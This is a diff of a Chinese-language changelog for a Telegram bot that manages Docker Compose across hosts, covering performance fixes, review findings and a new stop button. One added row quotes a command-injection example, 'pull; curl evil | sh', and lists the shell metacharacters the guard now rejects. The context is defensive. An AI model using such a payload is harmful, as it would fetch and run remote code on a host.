@@ -160,7 +160,7 @@ DOCKER_GID=$(getent group docker | cut -d: -f3) docker compose up -d
 DOCKER_GID=$(getent group docker | cut -d: -f3) docker compose up -d --build
 ```
 
-## 10. 修复记录（线上反馈驱动，v1.0.1 → v1.5.6）
+## 10. 修复记录（线上反馈驱动，v1.0.1 → v1.5.8）
 
 上线后按线上反馈修了七轮，又加了一轮功能（多主机），全部带回归测试（377 个用例）：
 
@@ -193,3 +193,4 @@ DOCKER_GID=$(getent group docker | cut -d: -f3) docker compose up -d --build
 | 首页 `❓ 帮助` 按钮换成 `🔄 刷新`；点 `/start` 要自动刷新数据，并显示 docker 运行数据（`🐳 Docker · 2 台主机，NAS（15）、VPS（10）`）与每个 Cline Key 的额度 | 首页之前是**纯缓存只读**：`summary` 不许跑 docker / 发 HTTP，所以没进过面板就只显示「点击进入」；按钮位给了帮助（而 `/help` 命令本来就有） | 首页改成**两帧**：第一帧用缓存秒开（要刷的模块挂 `⏳ 刷新中`），后台 `asyncio.gather` 刷完**原地编辑同一条面板**；新增 `ModuleSpec.refresh` / `refresh_ttl`（docker 15s、Cline 60s，`force=True` 来自 🔄 按钮）；`PanelManager.render` 加 `bot=` 支持无 Update 的后台回填，并用 `core.module_of_chat()` 保证**不回填到别的面板**；Cline 摘要改成 `🤖 Cline · 12 个 Key（正常 9 · 失败 2）` + 每个 Key 一行 `5时 15% / 周 30% / 月 20%`（单 Key 压成一行，别名走 `esc()`）；docker 摘要多主机逐台计数、异常主机挂 `⚠️`；底部按钮固定 `[🧰 任务中心] [🔄 刷新]`；测试 426 → 454 |
 | 「docker 运行速度有些慢，能否排查」 | 实测：`ls` 0.10s/主机、`config --services` 0.14s/**项目**、ssh 握手 0.36s/次；而 `scan_projects_sync()` 对**每个项目**都跑一次 `config --services`，且主机串行。15 本机 + 10 远端 ≈ 8~10s/次 | ① 服务列表按需 + 缓存（只取当前页/详情页，300s 复用，失败不缓存）；② 主机并行扫描（`HostScan` 结果对象，worker 不碰共享属性）；③ ssh `ControlMaster` 连接复用（`SSH_MULTIPLEX=0` 可关）；④ 远端探测遇 255 立即放弃第二个候选、`host.error` 的主机不探测；⑤ `get_projects()` 加锁，**只合并「在飞」的扫描**（顺序的第二次 🔄 照常重扫）。实测首屏 0.62s（扫描 0.46s + 首屏服务列表 0.16s） |
 | 交付前跑了一轮**独立只读审查**（P0/P1/P2 分级） | 审出 1 个 P0 + 7 个 P1，其中两个是我这轮改动**引入的回归**：① 服务名单从扫描时预填改成按需取后，`/upgrade NN <svc>` 的校验没补 `ensure_services` → 冷缓存下必然报「不存在服务」（旧代码是对的）；② `_spawn_home_refresh(bot=None)` 先置 `busy=True` 再 return → 该模块永久 `⏳ 刷新中` 且再也不刷 | P0：新增 `_service_exists()`（校验前 `ensure_services`）+ 冷缓存集成用例；P1：`bot is None` 提前判 + `_claim_refreshes`/`_release_refreshes` 占坑退坑；回填前重新确认「还在首页 + 还是那条面板」（`module_of_chat` + `panels.tracked`，检查到 render 之间无 await）；Cline 拆出 `fetch_lock_for()`（原来拿的是 Key 存储写锁 → 挡不住重复查询、反卡 `/addkey`）；首页摘要按当前别名过滤快照 + Key 变更即作废快照（原来 `/delkey` 后「2 个 Key」列 3 行）；去掉固定合并窗口（force 刷新必须真扫）；`ControlPath` 目录可写性校验 + 环境变量带空白则退回默认；`explain_exit(255)` 日志补 ssh 原话；配置错的主机文案不再说成「没装 compose」；`services_loaded` 契约进 porting-contract §7.1.1。测试 454 → 461 |
+| 要在确认页上停止容器；顺带问「四个按钮能不能一行」 | 以前只有 `✅ 确认升级 / 🔙 取消返回` 两种动作，停止容器得去远端敲 | `PanelManager.ask_confirm` 新增 `extras=[(按钮, 该按钮自己的确认令牌)]`：令牌与主确认一样绑发起人 + 60s TTL。项目/服务确认页改成一行四个 `[✅ 升级] [🔙 返回列表] [🛑 停止] [🏠 返回]`（Telegram 单行上限 8 个，四个放得下）；新增 `_do_stop()`：`compose stop [服务]`，与升级共用执行锁 / 任务中心 / 流式进度 / 收尾面板。**顺带堵了守卫的一个既有漏洞**：白名单模式都以 `*` 结尾，`docker compose -f x pull; curl evil \| sh` 会被整条放行——现在先整条否掉含 `; & \| $ ` \\ > <` 的命令，并加了真的用 `sh` 跑守卫的用例（`GuardScriptTest`）；守卫白名单同步加 `stop`。测试 461 → 469 |
